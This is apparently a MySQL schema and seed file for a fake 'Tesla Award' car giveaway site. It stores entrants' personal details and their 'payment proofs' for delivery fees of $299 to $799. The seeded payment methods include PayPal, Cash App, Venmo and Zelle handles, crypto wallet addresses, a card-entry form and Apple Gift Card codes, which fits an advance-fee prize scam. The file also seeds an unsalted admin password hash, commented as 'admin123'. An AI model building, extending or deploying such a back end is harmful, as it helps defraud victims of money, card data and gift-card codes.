-- Tesla Award — MySQL schema for InfinityFree
-- Import via phpMyAdmin. Charset: utf8mb4

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

CREATE TABLE IF NOT EXISTS giveaway_users (
  id CHAR(36) NOT NULL PRIMARY KEY,
  auth_user_id VARCHAR(64) DEFAULT NULL,
  email VARCHAR(255) NOT NULL,
  phone VARCHAR(64) DEFAULT NULL,
  first_name VARCHAR(120) DEFAULT NULL,
  last_name VARCHAR(120) DEFAULT NULL,
  verification_token VARCHAR(128) DEFAULT NULL,
  verification_status VARCHAR(32) NOT NULL DEFAULT 'pending',
  entry_count INT NOT NULL DEFAULT 1,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  verified_at DATETIME DEFAULT NULL,
  UNIQUE KEY uq_giveaway_users_email (email),
  KEY idx_users_status (verification_status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS user_sessions (
  token VARCHAR(128) NOT NULL PRIMARY KEY,
  user_id CHAR(36) NOT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  expires_at DATETIME DEFAULT NULL,
  KEY idx_sessions_user (user_id),
  CONSTRAINT fk_sessions_user FOREIGN KEY (user_id) REFERENCES giveaway_users(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS selected_cars (
  id CHAR(36) NOT NULL PRIMARY KEY,
  user_id CHAR(36) DEFAULT NULL,
  data JSON DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  KEY idx_selected_cars_user (user_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS delivery_details (
  id CHAR(36) NOT NULL PRIMARY KEY,
  user_id CHAR(36) DEFAULT NULL,
  data JSON DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  KEY idx_delivery_details_user (user_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS orders (
  id CHAR(36) NOT NULL PRIMARY KEY,
  order_id VARCHAR(64) NOT NULL,
  tracking_number VARCHAR(64) DEFAULT NULL,
  user_id CHAR(36) DEFAULT NULL,
  selected_car_id CHAR(36) DEFAULT NULL,
  delivery_details_id CHAR(36) DEFAULT NULL,
  delivery_method JSON DEFAULT NULL,
  payment_method JSON DEFAULT NULL,
  status VARCHAR(32) NOT NULL DEFAULT 'processing',
  order_date DATETIME DEFAULT NULL,
  estimated_delivery VARCHAR(128) DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  UNIQUE KEY uq_orders_order_id (order_id),
  KEY idx_orders_user (user_id),
  KEY idx_orders_status (status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS tracking_data (
  id CHAR(36) NOT NULL PRIMARY KEY,
  order_id VARCHAR(64) NOT NULL,
  stage VARCHAR(64) NOT NULL,
  stage_order INT NOT NULL DEFAULT 0,
  timestamp DATETIME DEFAULT NULL,
  completed TINYINT(1) NOT NULL DEFAULT 0,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  KEY idx_tracking_order (order_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS payment_methods (
  id CHAR(36) NOT NULL PRIMARY KEY,
  slug VARCHAR(64) NOT NULL,
  name VARCHAR(120) NOT NULL,
  display_name VARCHAR(120) DEFAULT NULL,
  type VARCHAR(32) DEFAULT 'wallet',
  description TEXT,
  wallet_address TEXT,
  account_details TEXT,
  qr_code_url TEXT,
  payment_instructions TEXT,
  logo_url TEXT,
  logo_id VARCHAR(64) DEFAULT NULL,
  icon_emoji VARCHAR(16) DEFAULT NULL,
  sort_order INT NOT NULL DEFAULT 99,
  enabled TINYINT(1) NOT NULL DEFAULT 1,
  config JSON DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  UNIQUE KEY uq_pm_slug (slug),
  KEY idx_pm_enabled (enabled)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS payment_proofs (
  id CHAR(36) NOT NULL PRIMARY KEY,
  user_id CHAR(36) DEFAULT NULL,
  order_id VARCHAR(64) DEFAULT NULL,
  order_ref VARCHAR(64) DEFAULT NULL,
  payment_method VARCHAR(120) DEFAULT NULL,
  proof_url VARCHAR(512) DEFAULT NULL,
  proof_back_url VARCHAR(512) DEFAULT NULL,
  proof_urls JSON DEFAULT NULL,
  proof_type VARCHAR(32) DEFAULT 'image',
  image_count INT NOT NULL DEFAULT 0,
  amount VARCHAR(64) DEFAULT NULL,
  status VARCHAR(32) NOT NULL DEFAULT 'pending',
  admin_notes TEXT,
  reviewed_at DATETIME DEFAULT NULL,
  reviewed_by VARCHAR(120) DEFAULT NULL,
  car_model VARCHAR(120) DEFAULT NULL,
  customer_name VARCHAR(160) DEFAULT NULL,
  customer_email VARCHAR(255) DEFAULT NULL,
  customer_phone VARCHAR(64) DEFAULT NULL,
  user_email VARCHAR(255) DEFAULT NULL,
  delivery_method VARCHAR(120) DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  KEY idx_pp_order (order_id),
  KEY idx_pp_status (status),
  KEY idx_pp_user (user_id),
  KEY idx_pp_email (customer_email)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS admin_settings (
  `key` VARCHAR(191) NOT NULL PRIMARY KEY,
  value JSON DEFAULT NULL,
  updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

SET FOREIGN_KEY_CHECKS = 1;

-- Default admin password hash = SHA-256 of "admin123"
INSERT INTO admin_settings (`key`, value) VALUES
('admin_password_hash', JSON_OBJECT('hash', '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9')),
('push_prefs', JSON_OBJECT('enabled', true, 'newOrder', true, 'paymentProof', true, 'promptDismissed', false)),
('push_subscriptions', JSON_OBJECT('items', JSON_ARRAY())),
('floating_contact', JSON_OBJECT('enabled', false, 'whatsapp', JSON_OBJECT('phone', ''), 'telegram', JSON_OBJECT('username', ''))),
('delivery_fees', JSON_OBJECT('standard', 299, 'express', 399, 'currency', 'USD'))
ON DUPLICATE KEY UPDATE value = VALUES(value);

-- Seed payment methods from production
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('8b305e4f-8c94-4f1e-a38f-153ead46351c', 'paypal', 'PayPal', 'PayPal', 'wallet', 'PayPal', '', 2, 1, CAST('{"email": "Joshbond@gmail.com", "qrCode": "", "accountName": "", "instructions": "Send the delivery fee to the PayPal email above.", "paypalMeLink": "", "walletAddress": "Joshbond@gmail.com"}' AS JSON), CAST('{"email": "Joshbond@gmail.com", "qrCode": "", "accountName": "", "instructions": "Send the delivery fee to the PayPal email above.", "paypalMeLink": "", "walletAddress": "Joshbond@gmail.com"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('87327f5d-ea78-4364-b691-bf0376f92a04', 'cashapp', 'Cash App', 'Cash App', 'wallet', 'Instant payment with your Cash App balance or debit card', 'assets/payment-logos/cashapp.svg', 2, 1, CAST('{"qrCode": "", "cashtag": "$Joshbond", "accountName": "", "instructions": "Send the delivery fee to the $Cashtag above.", "walletAddress": "$Joshbond"}' AS JSON), CAST('{"qrCode": "", "cashtag": "$Joshbond", "accountName": "", "instructions": "Send the delivery fee to the $Cashtag above.", "walletAddress": "$Joshbond"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('7c3bbd1d-123a-4d2e-8985-9dc449a90796', 'venmo', 'Venmo', 'Venmo', 'wallet', 'Fast, secure payments with Venmo', 'assets/payment-logos/venmo.svg', 3, 1, CAST('{"qrCode": "", "username": "@joshbond", "accountName": "", "instructions": "Send the delivery fee to the Venmo handle above.", "walletAddress": "@joshbond"}' AS JSON), CAST('{"qrCode": "", "username": "@joshbond", "accountName": "", "instructions": "Send the delivery fee to the Venmo handle above.", "walletAddress": "@joshbond"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('34bbd3f8-5cd8-4479-80ff-b59411081a02', 'zelle', 'Zelle', 'Zelle', 'bank', 'Send directly from your bank account with Zelle', 'assets/payment-logos/zelle.svg', 4, 1, CAST('{"email": "zelle@teslaglobalawards.com", "phone": "+1 (415) 892-3401", "instructions": "Send the delivery fee to the email or phone above.", "recipientName": "Tesla Global Awards LLC", "walletAddress": "zelle@teslaglobalawards.com"}' AS JSON), CAST('{"email": "zelle@teslaglobalawards.com", "phone": "+1 (415) 892-3401", "instructions": "Send the delivery fee to the email or phone above.", "recipientName": "Tesla Global Awards LLC", "walletAddress": "zelle@teslaglobalawards.com"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('0c906406-e0ae-4943-98f9-c1eb0f3e402e', 'bitcoin', 'Bitcoin (BTC)', 'Bitcoin (BTC)', 'crypto', 'Pay with Bitcoin on the Bitcoin network', 'assets/payment-logos/bitcoin.svg', 5, 1, CAST('{"qrCode": "", "network": "Bitcoin (BTC) \\u2014 Mainnet", "walletLabel": "", "instructions": "Copy the wallet address and send the delivery fee in BTC.", "walletAddress": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"}' AS JSON), CAST('{"qrCode": "", "network": "Bitcoin (BTC) \\u2014 Mainnet", "walletLabel": "", "instructions": "Copy the wallet address and send the delivery fee in BTC.", "walletAddress": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('f76e45fd-efdb-47a1-b814-43cfca1c219d', 'ethereum', 'Ethereum (ETH)', 'Ethereum (ETH)', 'crypto', 'Pay with Ethereum (ETH)', 'assets/payment-logos/ethereum.svg', 6, 1, CAST('{"qrCode": "", "network": "Ethereum Mainnet (ERC-20)", "instructions": "Copy the wallet address and send the delivery fee in ETH.", "confirmations": "12 confirmations required", "walletAddress": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"}' AS JSON), CAST('{"qrCode": "", "network": "Ethereum Mainnet (ERC-20)", "instructions": "Copy the wallet address and send the delivery fee in ETH.", "confirmations": "12 confirmations required", "walletAddress": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('f065cf28-3601-4f80-8043-c665e00a9b4b', 'usdt-erc20', 'USDT (ERC-20)', 'USDT (ERC-20)', 'crypto', 'Tether USD on the Ethereum network', 'assets/payment-logos/usdt-erc20.svg', 7, 1, CAST('{"qrCode": "", "network": "Ethereum Mainnet (ERC-20)", "instructions": "Copy the wallet address and send the delivery fee in USDT (ERC-20).", "tokenContract": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "walletAddress": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"}' AS JSON), CAST('{"qrCode": "", "network": "Ethereum Mainnet (ERC-20)", "instructions": "Copy the wallet address and send the delivery fee in USDT (ERC-20).", "tokenContract": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "walletAddress": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('d1641dd2-bc2d-485c-8583-621b9397fd61', 'usdt-trc20', 'USDT (TRC-20)', 'USDT (TRC-20)', 'crypto', 'Tether USD on the TRON network — lower fees', 'assets/payment-logos/usdt-trc20.svg', 8, 1, CAST('{"qrCode": "", "network": "TRON Network (TRC-20)", "instructions": "Copy the wallet address and send the delivery fee in USDT (TRC-20).", "walletAddress": "TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS"}' AS JSON), CAST('{"qrCode": "", "network": "TRON Network (TRC-20)", "instructions": "Copy the wallet address and send the delivery fee in USDT (TRC-20).", "walletAddress": "TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('ad22adbd-1bd8-4a92-a956-4aa3e8746148', 'creditcard', 'Credit / Debit Card', 'Credit / Debit Card', 'card', 'Visa, Mastercard, Amex, and Discover accepted', 'assets/payment-logos/creditcard.svg', 9, 1, CAST('{"qrCode": "", "instructions": "Enter your card details below to pay the delivery fee.", "supportPhone": "", "acceptedNetworks": ""}' AS JSON), CAST('{"qrCode": "", "instructions": "Enter your card details below to pay the delivery fee.", "supportPhone": "", "acceptedNetworks": ""}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO payment_methods (id, slug, name, display_name, type, description, logo_url, sort_order, enabled, config, account_details, created_at) VALUES ('0a4b44ef-7025-48cc-8b72-17f33875a0ce', 'applegift', 'Apple Gift Card', 'Apple Gift Card', 'gift', 'Pay with an Apple Gift Card — instant and private', 'assets/payment-logos/applegift.svg', 10, 1, CAST('{"instructions": "Enter your Apple Gift Card code below for the delivery fee.", "purchaseLocations": "Apple Store, Apple.com, Walmart, Target, Best Buy, CVS, Walgreens", "denominationsAccepted": "$25, $50, $100, $200 denominations accepted"}' AS JSON), CAST('{"instructions": "Enter your Apple Gift Card code below for the delivery fee.", "purchaseLocations": "Apple Store, Apple.com, Walmart, Target, Best Buy, CVS, Walgreens", "denominationsAccepted": "$25, $50, $100, $200 denominations accepted"}' AS JSON), NOW()) ON DUPLICATE KEY UPDATE name=VALUES(name), config=VALUES(config), enabled=VALUES(enabled), sort_order=VALUES(sort_order);
INSERT INTO admin_settings (`key`, value) VALUES ('whatsapp', CAST('{"number": "+1234567890", "enabled": true, "message": "Hello! I need help with my Tesla Award Program order."}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('telegram', CAST('{"link": "", "enabled": false, "username": ""}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('general', CAST('{"siteName": "Tesla Award Program", "contactEmail": "support@teslaaward.com"}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('delivery_fees', CAST('[{"id": "f1", "days": "5\\u20137 Business Days", "name": "Standard Delivery", "price": "$299", "enabled": true, "description": "Delivered to your door by a certified transport agent"}, {"id": "f2", "days": "2\\u20133 Business Days", "name": "Express Delivery", "price": "$499", "enabled": true, "description": "Priority handling & expedited transport nationwide"}, {"id": "f3", "days": "1\\u20132 Business Days", "name": "Premium White Glove", "price": "$799", "enabled": true, "description": "Concierge delivery with personal demonstration & setup"}]' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('delivery_fee', CAST('{"express": 799, "currency": "USD", "standard": 499, "express_fee": 799, "standard_fee": 499}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('push_prefs', CAST('{"enabled": true, "newOrder": true, "paymentProof": true, "promptDismissed": false}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('push_subscriptions', CAST('{"items": [{"keys": {"auth": "i7otRnWS7RFV5PJvUPMxTQ", "p256dh": "BHGZFymGWjkJSS2RwWfb6rotni5wNB32Ly9Af8WJdNWcvXnRZE1qvqa8clKTIHbMk6b4XqCMWc2-VPtaUp4zKjQ"}, "endpoint": "https://fcm.googleapis.com/fcm/send/ecjxNly2hyY:APA91bF5Da8FZetR72__231t6cxFhPFYi3aO78lYf5i6EG1scbSFRWuqxOLnSUc_vZJY5c0mHQ3ROYszKU6gZ3jwZxcJYavoHkmgPcWk2YSBztthcna-GCNmF87Vtb-oXrci7XNOFpJh", "createdAt": "2026-08-20T07:56:13.920Z", "expirationTime": null}]}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('floating_contact', CAST('{"enabled": false, "telegram": {"message": "", "username": ""}, "whatsapp": {"phone": "", "message": ""}}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('whatsapp_settings', CAST('{"phone": "", "enabled": false, "message": "", "telegramMessage": "", "telegramUsername": ""}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
INSERT INTO admin_settings (`key`, value) VALUES ('admin_password_hash', CAST('{"hash": "2bfe9fde1b57dfe6af18d90ae8a2be9f42842e2e17af03c19b6689ea57291417"}' AS JSON)) ON DUPLICATE KEY UPDATE value=VALUES(value);
